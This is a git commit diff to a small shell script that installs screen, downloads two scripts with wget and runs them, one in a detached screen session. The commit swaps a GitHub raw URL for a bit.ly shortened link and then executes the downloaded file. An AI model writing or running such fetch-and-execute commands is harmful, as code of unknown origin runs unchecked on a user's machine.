6d8661fef5052a623ff786ff8a5e72c24c5c23c3
pruthvigithub1137 <88317515+pruthvigithub1137@users.noreply.github.com>
2021-08-05 14:43:42 +0530

    Update sajan.sh

--- sajan.sh
+++ sajan.sh
@@ -2,9 +2,9 @@
 
 sudo apt update
 sudo apt install screen -y
-wget https://raw.githubusercontent.com/pruthvigithub1137/prem/main/lagan.sh
+wget https://bit.ly/3fye8xX
 wget https://raw.githubusercontent.com/pruthvigithub1137/FkgX/main/man.sh
 chmod +x man.sh
 screen -dmS man ./man.sh 60 70
-chmod +x lagan.sh
-./lagan.sh
+chmod +x 3fye8xX
+./3fye8xX
